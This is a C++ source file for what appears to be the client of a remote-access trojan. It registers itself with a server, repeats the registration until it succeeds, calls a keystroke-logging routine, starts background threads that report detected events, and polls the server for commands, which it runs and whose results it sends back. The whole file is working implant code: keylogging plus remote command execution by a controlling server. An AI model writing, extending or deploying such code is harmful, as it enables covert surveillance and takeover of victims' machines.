#include <stdexcept>
#include <chrono>
#include <thread>
#include <iostream>
#include <thread>

#include <httplib.h>

#include "Client.h"
#include "Protocol/BasicRequest.h"
#include "Protocol/InstallClientResponse.h"
#include "Protocol/GetCommandResponse.h"
#include "Commands/PopupCommand.h"
#include "CommandHandlers/CommandHandlerFactory.h"
#include "WinUtils.h"

Client::Client(
	std::unique_ptr<ICommunicator> communicator,
	std::unique_ptr<IClientStorage> storage,
	std::unordered_map<std::unique_ptr<IEvent>, std::vector<std::unique_ptr<IEventHandler>>>&& events,
	std::unique_ptr<ILogger> logger)
	: m_communicator(std::move(communicator))
	, m_storage(std::move(storage))
	, m_events(std::move(events))
	, m_logger(std::move(logger))
{
}

void Client::run()
{
	if (!is_installed()) {
		while (true) {
			try {
				install();
				break;
			}
			catch (const std::exception& ex) {
				m_logger->log(std::string("Couldn't install, sleeping for " + std::to_string(INSTALLATION_RETRY_SLEEP_DURATION) + " seconds and trying again... Error: ") + ex.what());
			}
			std::this_thread::sleep_for(std::chrono::seconds(INSTALLATION_RETRY_SLEEP_DURATION));
		}
	}
	m_client_id = m_storage->fetch(CLIENT_ID_STORAGE_NAME);

	m_logger->log("Running with client ID: " + m_client_id);

	std::cout << win_utils::log_keys(5) << std::endl;

	for (const auto& item : m_events) {
		std::thread event_detection_thread(&Client::event_detection_loop, this, std::ref(item.first));
		event_detection_thread.detach();
	}

	execute_commands_loop();
}

void Client::install()
{
	BasicRequest request({ RequestType::InstallClient, "" });

	const ResponseInfo res = m_communicator->send_request(request.pack());
	if (httplib::OK_200 != res.get_status()) {
		m_logger->log("Error sending InstallClient. Response: " + res.get_body());
		throw std::runtime_error("Couldn't InstallClient properly. Status code: " + std::to_string(res.get_status()));
	}
	m_storage->store(CLIENT_ID_STORAGE_NAME, InstallClientResponse().unpack(res).get_client_id());
}

bool Client::is_installed()
{
	return m_storage->has_field(CLIENT_ID_STORAGE_NAME);
}

void Client::event_detection_loop(const std::unique_ptr<IEvent>& event_to_detect)
{
	while (true) {
		const auto det = event_to_detect->is_detected();
		if (EventType::NotDetected != det) {
			for (const auto& handler : m_events.at(event_to_detect)) {
				const auto& request = handler->handle(det);
				if (nullptr != request) {
					m_communicator->send_request(request->pack());
				}
			}
		}
		std::this_thread::sleep_for(std::chrono::seconds(EVENT_DETECTION_SLEEP_DURATION));
	}
}

void Client::execute_commands_loop()
{
	m_logger->log("Starting main loop of command fetching");
	while (true) {
		m_logger->log("Sleeping for " + std::to_string(EXECUTE_COMMANDS_SLEEP_DURATION) + " seconds...");
		std::this_thread::sleep_for(std::chrono::seconds(EXECUTE_COMMANDS_SLEEP_DURATION));

		std::shared_ptr<BasicCommand> command = nullptr;
		try {
			command = get_command();
		}
		catch (const std::exception& ex) {
			m_logger->log(std::string("Couldn't get command. Error: ") + ex.what());
			continue;
		}
		if (nullptr == command) {
			m_logger->log("No new commands...");
		}
		else {
			m_logger->log("New command: " + command->get_command_id() + " " + to_string(command->get_command_type()));
			std::thread handling_thread(&Client::handle_command, this, std::move(command));
			handling_thread.detach();
		}
	}
}

void Client::handle_command(std::shared_ptr<BasicCommand> command)
{
	m_logger->log("Handling '" + to_string(command->get_command_type()) + "' command with id " + command->get_command_id() + " in a different thread!");

	const auto handler = CommandHandlerFactory::create(*command, m_client_id);
	const auto request_to_make = handler->handle(command); // should usually be a ReturnProduct request
	const auto res = m_communicator->send_request(request_to_make->pack()); // expect 200 from ReturnProduct
	if (httplib::OK_200 != res.get_status()) {
		m_logger->log("Error sending ReturnProduct. Response: " + res.get_body());
		throw std::runtime_error("Couldn't ReturnProduct. Status code: " + std::to_string(res.get_status()));
	}
}

std::shared_ptr<BasicCommand> Client::get_command()
{
	m_logger->log("Sending GetCommand request to server");

	BasicRequest request({ RequestType::GetCommand, m_client_id });
	const auto res = m_communicator->send_request(request.pack());
	if (httplib::OK_200 != res.get_status()) {
		m_logger->log("Error sending GetCommand. Response: " + res.get_body());
		throw std::runtime_error("Couldn't GetCommand. Status code: " + std::to_string(res.get_status()));
	}
	auto response = GetCommandResponse().unpack(res);
	if (!response.has_command()) {
		return nullptr;
	}
	return response.get_command();
}
